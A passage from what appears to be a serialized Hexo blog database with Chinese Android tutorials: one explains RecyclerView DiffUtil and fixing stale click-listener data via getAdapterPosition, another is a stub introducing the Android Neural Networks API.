class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> RecyclerView.ViewHolder <span class=\"title function_\">onCreateViewHolder</span><span class=\"params\">(ViewGroup parent, <span class=\"type\">int</span> viewType)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...省略holder实例化</span></span><br><span class=\"line\">        holder.itemView.setTag(holder); <span class=\"comment\">// 把holder当tag存</span></span><br><span class=\"line\">        holder.itemView.setOnClickListener(mOnClickListener);</span><br><span class=\"line\">        holder.itemView.setOnLongClickListener(mOnLongClickListener);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> holder;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 继承实现的实际业务Adapter</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">XXXAdapter</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">BaseXXXAdapter</span>&lt;User&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">XXXAdapter</span><span class=\"params\">(Context context)</span> &#123;</span><br><span class=\"line\">        setOnItemClickListener(<span class=\"keyword\">new</span> <span class=\"title class_\">OnItemClickListener</span>() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onItemClick</span><span class=\"params\">(View view, RecyclerView.ViewHolder holder, <span class=\"type\">int</span> position)</span> &#123;</span><br><span class=\"line\">                <span class=\"type\">MyItemViewHolder</span> <span class=\"variable\">h</span> <span class=\"operator\">=</span> (MyItemViewHolder) holder;</span><br><span class=\"line\">                <span class=\"comment\">// 每次点击都保证了为对应位置的数据，再也不用担心数据错位问题了</span></span><br><span class=\"line\">                <span class=\"type\">User</span> <span class=\"variable\">user</span> <span class=\"operator\">=</span> getData().get(position);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onItemLongClick</span><span class=\"params\">(View view, RecyclerView.ViewHolder holder, <span class=\"type\">int</span> position)</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">// ...</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"节能刷新\"><a href=\"#节能刷新\" class=\"headerlink\" title=\"节能刷新\"></a>节能刷新</h3><p>移动设备屏幕大小有限（不得不说我是顽固的小屏爱好者，大于5.5寸难以接受，时代已经抛弃我了哈哈），列表（List）可以说是一个出现非常高频的交互设计。大多数情况下我们的列表不仅仅是一次性加载本地数据，而要应付来自网络的各种动态内容，可能是增加、删除等操作。</p>\n<p>在Android开发中，一个耳熟能详的方法就是 <code>notifyDataSetChanged</code> ，在适配器（Adapter）的设计模式下，每当我们的列表数据发生变更时，就需要调用此方法来更新UI。然而，这个方法并不“<strong>节能</strong>”，它会同时刷新列表中的所有item，包括那些并没有变化的数据，这样就带来很多计算资源的浪费。要知道，从你的一个 <code>setText</code> 或者 <code>setImageResource</code> 方法调用到最终呈现到屏幕上，软件到硬件，中间经历了非常复杂的过程。基于能省则省的移动开发原则，有没有更好的办法呢？</p>\n<h3 id=\"DiffUtil用起来\"><a href=\"#DiffUtil用起来\" class=\"headerlink\" title=\"DiffUtil用起来\"></a>DiffUtil用起来</h3><p>谷歌确实也考虑到了这个问题，所以不知道在什么时候（暂时没有去查阅）推出了DiffUtil这个解决方案。在RecyclerView的依赖包下面，可以看到，除了DiffUtil，还有异步处理数据等一系列有趣的工具。<br><img src=\"https://imgconvert.csdnimg.cn/20200113015406917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>DiffUtil的运用逻辑非常简单，大致如下：</p>\n<ul>\n<li>实现对比新旧数据的方法（类似比较器），这样DiffUtil便知道当新数据来临时，该不该更新某个item。</li>\n<li>更新数据时，把新旧数据丢给DiffUtil，底层会根据你实现的对比方法，利用一种差分算法自动计算出差异，最后局部更新到UI。</li>\n</ul>\n<p>这样做的好处就是避免了不必要的UI更新，DiffUtil计算出差异之后，只刷新产生变动的item。具体地，我们可以在Adapter的 <code>onBindViewHolder</code> 方法打断点或者日志观察，或者调用 <code>registerAdapterDataObserver</code> 方法监听item的各种操作情况。其次，以前的 <code>notifyDataSetChanged</code> 方法由于会刷新整个列表所以没有原生的动画效果，而DiffUtil内部最终调用了各种 <code>notifyItemXXX</code> 方法。</p>\n<p>DiffUtil的使用也很简单：</p>\n<p>1、先实现比较新旧数据的回调，可以是一个独立的类，也可以写成Adapter的内部类：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">BaseXXXAdapter</span>&lt;T&gt; <span class=\"keyword\">extends</span> <span class=\"title class_\">RecyclerView</span>.Adapter &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DiffCallback</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">DiffUtil</span>.Callback &#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> List&lt;T&gt; oldData, newData;</span><br><span class=\"line\"></span><br><span class=\"line\">        DiffCallback(List&lt;T&gt; oldData, List&lt;T&gt; newData) &#123;</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.oldData = oldData;</span><br><span class=\"line\">            <span class=\"built_in\">this</span>.newData = newData;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">getOldListSize</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> oldData.size();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">getNewListSize</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> newData.size();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">areItemsTheSame</span><span class=\"params\">(<span class=\"type\">int</span> oldItemPosition, <span class=\"type\">int</span> newItemPosition)</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">T</span> <span class=\"variable\">oldT</span> <span class=\"operator\">=</span> oldData.get(oldItemPosition);</span><br><span class=\"line\">            <span class=\"type\">T</span> <span class=\"variable\">newT</span> <span class=\"operator\">=</span> newData.get(newItemPosition);</span><br><span class=\"line\">            <span class=\"comment\">// 实际情况最好是在此处对比新旧数据的id（比如用户uid），这里为了方便示例直接equals对象了</span></span><br><span class=\"line\">            <span class=\"comment\">// 若此处返回true，则DiffUtil会再调用下面的areContentsTheSame方法，进一步对比UI是否有变化</span></span><br><span class=\"line\">            <span class=\"comment\">// 若此处返回false，则说明id都不同，肯定不是一个item</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> Objects.equals(oldT, newT);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">areContentsTheSame</span><span class=\"params\">(<span class=\"type\">int</span> oldItemPosition, <span class=\"type\">int</span> newItemPosition)</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// TODO 比较新旧数据（主要是UI展示内容）是否相同，这里为了方便示例直接返回true</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>2、然后在Adapter内部实现一个update数据的方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">updateData</span><span class=\"params\">(List&lt;T&gt; newData)</span> &#123;</span><br><span class=\"line\">    DiffUtil.<span class=\"type\">DiffResult</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> DiffUtil.calculateDiff(<span class=\"keyword\">new</span> <span class=\"title class_\">DiffCallback</span>(getData(), newData));</span><br><span class=\"line\">    <span class=\"comment\">// 这里的getData即表示获取整个列表的数据，自行实现即可</span></span><br><span class=\"line\">    getData().clear();</span><br><span class=\"line\">    getData().addAll(newData);</span><br><span class=\"line\">    result.dispatchUpdatesTo(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>注意这里的 <code>dispatchUpdatesTo</code> 可以在clear之前，也可以在addAll之后，实际效果暂未发现什么区别，之前查阅资料包括官方示例也都是最后执行dispatch，姑且认为这样算标准吧。</p>\n<p>3、……咦，怎么才两步，确实就这么简单。重点还是 <code>areItemsTheSame</code> 和 <code>areContentsTheSame</code> 方法，后者大部分时候只需要对比每个item上UI展示出来的数据即可，因为用户只关心眼见的内容。</p>\n<h3 id=\"解决使用后产生的问题\"><a href=\"#解决使用后产生的问题\" class=\"headerlink\" title=\"解决使用后产生的问题\"></a>解决使用后产生的问题</h3><p>我们会发现在上面的使用示例中，<code>updateData</code> 方法内部对原数据进行了清除和添加的操作，这会导致一个问题便是：<strong>列表数据集合中的对象已经变了，即使其某项对应的UI内容没有发生变化</strong>。</p>\n<p>举个例子，一个通讯录列表里面有 <strong>[小明, 小红]</strong> 两个人，对应内存地址为 **[a1, a2]**，现在通过上述 <code>updateData</code> 方法更新了通讯录列表，UI内容变成了 **[小王, 小红]**，对应内存地址为 <strong>[b1, b2]<strong>。对用户来说小红这个item看上去没有发生变化，但其实对应的数据类对象已经不同。</strong>而且此时 <code>onBindViewHolder</code> 方法只会触发一次，将小明更新成小王，而不会触发小红那个position对应的 <code>onBindViewHolder</code></strong> 。</p>\n<p>上述细节很关键，如果开发过程中绑定（bind）数据<strong>不恰当</strong>的话，就容易造成各种奇异问题，比如网上资料最多的DiffUtil导致item点击事件数据错位问题、数组越界崩溃问题等等。</p>\n<p>这里的“不恰当”，绝大部分情况下，总结出来：其实指的就是在 <code>onBindViewHolder</code> 方法中持有了某个位置（position）对应数据的不可变对象。最常见的误用示例就是在 <code>onBindViewHolder</code> 中设置某些控件的点击事件并引用数据对象：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 此处假设item的数据类为User</span></span><br><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onBindViewHolder</span><span class=\"params\">(RecyclerView.ViewHolder holder, <span class=\"type\">int</span> position)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">MyItemViewHolder</span> <span class=\"variable\">h</span> <span class=\"operator\">=</span> (MyItemViewHolder) holder;</span><br><span class=\"line\">    <span class=\"type\">User</span> <span class=\"variable\">user</span> <span class=\"operator\">=</span> getData().get(position);</span><br><span class=\"line\">    h.mNameTextView.setOnClickListener(v -&gt; &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 第2种写法：User user = getData().get(position);</span></span><br><span class=\"line\">        <span class=\"comment\">// 假设这里是点击item跳转到该User对应的个人主页界面</span></span><br><span class=\"line\">        startWebView(user.getHomePageUrl());</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在不接入DiffUtil之前，上面这段代码没有任何问题，因为我们都是使用 <code>notifyDataSetChanged</code> 方法来更新UI，每次更新调用到 <code>onBindViewHolder</code> 时，点击事件都会重新设置，get出来的user对象自然也是最新的。一旦我们使用了DiffUtil，就会出问题了。</p>\n<p>回到上面小王绿了小明的例子，在我们的 <code>updateData</code> 方法执行后，如果我们只对比了user的名字这个属性（其实也只需要对比这个属性），那么小红那一个item就不会触发对应的 <code>onBindViewHolder</code> ，即小红的点击事件回调里，<strong>仍然持有着旧数据集的user对象（对应那个内存地址a2）</strong>。但实际上小红应该对应 <strong>b2</strong> 那个内存了，这就造成 <strong>a2</strong> 内存无法释放，问题是不是显得有点严重了。</p>\n<p>有同学说无所谓呀，反正点击事件依然有效。那如果我说网络数据刷新下来小红的 <strong>homePageUrl</strong> 变了呢？是不是还得把这个属性加入DiffUtil的对比方法中？这样最终会导致小红的 <code>onBindViewHolder</code> 方法也执行，跟 <code>notifyDataSetChanged</code> 岂不是没什么两样了？</p>\n<p>此外，若get对象写成注释中的第2种写法，且列表第0个位置的item被删了呢？小红顶上去变成了第0个，此时由于小红的UI内容没变，只是位置变了，所以 <code>onBindViewHolder</code> 依然不会执行。以上面的示例代码来看，当再次点击小红时，就会直接出现数组越界的异常。因为position还是之前的1，而此时小红的position已经为0。</p>\n<p>显然上述出现的这些问题不符合谷歌的设计初衷，也不符合我们使用DiffUtil的初衷。其实<strong>解决办法</strong>很简单，就是要对 <code>onBindViewHolder</code> 方法有一个正确的认知，其原则就是：</p>\n<ul>\n<li><code>onBindViewHolder</code> 只做UI内容的更新，如 <code>setText</code>，<code>setImageXXX</code> 等方法。做到数据对象一次性使用。</li>\n<li>不要跨作用域持有与位置（position）相关的数据，比如每个item的数据对象。尤其就是避免在 <code>onBindViewHolder</code> 中设置点击事件监听。</li>\n</ul>\n<p>正确的点击事件监听还是参照如下形式比较好：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 比如这是某个Base适配器类</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">BaseXXXAdapter</span>&lt;T&gt; <span class=\"keyword\">extends</span> <span class=\"title class_\">RecyclerView</span>.Adapter &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> View.OnClickListener mOnClickListener;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> View.OnLongClickListener mOnLongClickListener;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> OnItemClickListener mOnItemClickListener;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">OnItemClickListener</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">void</span> <span class=\"title function_\">onItemClick</span><span class=\"params\">(View view, RecyclerView.ViewHolder holder, <span class=\"type\">int</span> position)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">void</span> <span class=\"title function_\">onItemLongClick</span><span class=\"params\">(View view, RecyclerView.ViewHolder holder, <span class=\"type\">int</span> position)</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">BaseXXXAdapter</span><span class=\"params\">(Context context)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...</span></span><br><span class=\"line\">        mOnClickListener = v -&gt; &#123;</span><br><span class=\"line\">            RecyclerView.<span class=\"type\">ViewHolder</span> <span class=\"variable\">h</span> <span class=\"operator\">=</span> (RecyclerView.ViewHolder) v.getTag();</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">pos</span> <span class=\"operator\">=</span> h.getAdapterPosition();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mOnItemClickListener != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                mOnItemClickListener.onItemClick(v, h, pos);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        mOnLongClickListener = v -&gt; &#123;</span><br><span class=\"line\">            RecyclerView.<span class=\"type\">ViewHolder</span> <span class=\"variable\">h</span> <span class=\"operator\">=</span> (RecyclerView.ViewHolder) v.getTag();</span><br><span class=\"line\">            <span class=\"type\">int</span> <span class=\"variable\">pos</span> <span class=\"operator\">=</span> h.getAdapterPosition();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mOnItemClickListener != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                mOnItemClickListener.onItemLongClick(v, h, pos);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setOnItemClickListener</span><span class=\"params\">(OnItemClickListener clickListener)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.mOnItemClickListener = clickListener;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> RecyclerView.ViewHolder <span class=\"title function_\">onCreateViewHolder</span><span class=\"params\">(ViewGroup parent, <span class=\"type\">int</span> viewType)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ...省略holder实例化</span></span><br><span class=\"line\">        holder.itemView.setTag(holder); <span class=\"comment\">// 把holder当tag存</span></span><br><span class=\"line\">        holder.itemView.setOnClickListener(mOnClickListener);</span><br><span class=\"line\">        holder.itemView.setOnLongClickListener(mOnLongClickListener);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> holder;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 继承实现的实际业务Adapter</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">XXXAdapter</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">BaseXXXAdapter</span>&lt;User&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">XXXAdapter</span><span class=\"params\">(Context context)</span> &#123;</span><br><span class=\"line\">        setOnItemClickListener(<span class=\"keyword\">new</span> <span class=\"title class_\">OnItemClickListener</span>() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onItemClick</span><span class=\"params\">(View view, RecyclerView.ViewHolder holder, <span class=\"type\">int</span> position)</span> &#123;</span><br><span class=\"line\">                <span class=\"type\">MyItemViewHolder</span> <span class=\"variable\">h</span> <span class=\"operator\">=</span> (MyItemViewHolder) holder;</span><br><span class=\"line\">                <span class=\"comment\">// 每次点击都保证了为对应位置的数据，再也不用担心数据错位问题了</span></span><br><span class=\"line\">                <span class=\"type\">User</span> <span class=\"variable\">user</span> <span class=\"operator\">=</span> getData().get(position);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onItemLongClick</span><span class=\"params\">(View view, RecyclerView.ViewHolder holder, <span class=\"type\">int</span> position)</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">// ...</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"layout":"post","title":"Android神经网络（Neural Networks API）初探","subtitle":"见微知著。","date":"2020-01-13T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n> 谷歌早在Android 8.0就推出了神经网络API，不过现在网上资料仍旧不多，随着TensorFlow Lite的成熟，底层API更是无人问津。\n\n### 前言\n\nAndroid Neural Networks API (NNAPI) 是一个 Android C API，专为在 Android 设备上运行计算密集型运算从而实现机器学习而设计。NNAPI 旨在为更高层级的机器学习框架（如 TensorFlow Lite 和 Caffe2）提供一个基本功能层，用来建立和训练神经网络。搭载 Android 8.1（API 级别 27）或更高版本的所有 Android 设备上都提供该 API。\n\n### 参考\n\n- [NNAPI介绍](https://developer.android.com/ndk/guides/neuralnetworks)\n- [NNAPI文档](https://developer.android.com/ndk/guides/neuralnetworks)\n- [NNAPI官方Sample](https://github.com/android/ndk-samples/tree/master/nn_sample)\n- [NNAPI实现-TFLite](https://github.com/tensorflow/tensorflow/tree/master/tensorflow/lite/nnapi)\n\n挖坑待填，未完待续……\n","source":"_posts/2020-01-14-Android神经网络（Neural Networks API）初探.md","raw":"---\nlayout:     post\ntitle:      Android神经网络（Neural Networks API）初探\nsubtitle:   见微知著。\ndate:       2020-01-14\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - AI\n---\n\n> 谷歌早在Android 8.0就推出了神经网络API，不过现在网上资料仍旧不多，随着TensorFlow Lite的成熟，底层API更是无人问津。\n\n### 前言\n\nAndroid Neural Networks API (NNAPI) 是一个 Android C API，专为在 Android 设备上运行计算密集型运算从而实现机器学习而设计。NNAPI 旨在为更高层级的机器学习框架（如 TensorFlow Lite 和 Caffe2）提供一个基本功能层，用来建立和训练神经网络。搭载 Android 8.1（API 级别 27）或更高版本的所有 Android 设备上都提供该 API。\n\n### 参考\n\n- [NNAPI介绍](https://developer.android.com/ndk/guides/neuralnetworks)\n- [NNAPI文档](https://developer.android.com/ndk/guides/neuralnetworks)\n- [NNAPI官方Sample](https://github.com/android/ndk-samples/tree/master/nn_sample)\n- [NNAPI实现-TFLite](https://github.com/tensorflow/tensorflow/tree/master/tensorflow/lite/nnapi)\n\n挖坑待填，未完待续……\n","slug":"Android神经网络（Neural Networks API）初探","published":1,"updated":"2024-03-25T07:31:25.859Z","comments":1,"photos":[],"link":"","_id":"cluaufh0w0022the6cqzw9jb5","content":"<blockquote>\n<p>谷歌早在Android 8.0就推出了神经网络API，不过现在网上资料仍旧不多，随着TensorFlow Lite的成熟，底层API更是无人问津。</p>\n</blockquote>\n<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>Android Neural Networks API (NNAPI) 是一个 Android C API，专为在 Android 设备上运行计算密集型运算从而实现机器学习而设计。NNAPI 旨在为更高层级的机器学习框架（如 TensorFlow Lite 和 Caffe2）提供一个基本功能层，用来建立和训练神经网络。搭载 Android 8.1（API 级别 27）或更高版本的所有 Android 设备上都提供该 API。</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><ul>\n<li><a href=\"https://developer.android.com/ndk/guides/neuralnetworks\">NNAPI介绍</a></li>\n<li><a href=\"https://developer.android.com/ndk/guides/neuralnetworks\">NNAPI文档</a></li>\n<li><a href=\"https://github.com/android/ndk-samples/tree/master/nn_sample\">NNAPI官方Sample</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/tree/master/tensorflow/lite/nnapi\">NNAPI实现-TFLite</a></li>\n</ul>\n<p>挖坑待填，未完待续……</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<blockquote>\n<p>谷歌早在Android 8.0就推出了神经网络API，不过现在网上资料仍旧不多，随着TensorFlow Lite的成熟，底层API更是无人问津。</p>\n</blockquote>\n<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>Android Neural Networks API (NNAPI) 是一个 Android C API，专为在 Android 设备上运行计算密集型运算从而实现机器学习而设计。NNAPI 旨在为更高层级的机器学习框架（如 TensorFlow Lite 和 Caffe2）提供一个基本功能层，用来建立和训练神经网络。搭载 Android 8.1（API 级别 27）或更高版本的所有 Android 设备上都提供该 API。</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><ul>\n<li><a href=\"https://developer.android.com/ndk/guides/neuralnetworks\">NNAPI介绍</a></li>\n<li><a href=\"https://developer.android.com/ndk/guides/neuralnetworks\">NNAPI文档</a></li>\n<li><a href=\"https://github.com/android/ndk-samples/tree/master/nn_sample\">NNAPI官方Sample</a></li>\n<li><a 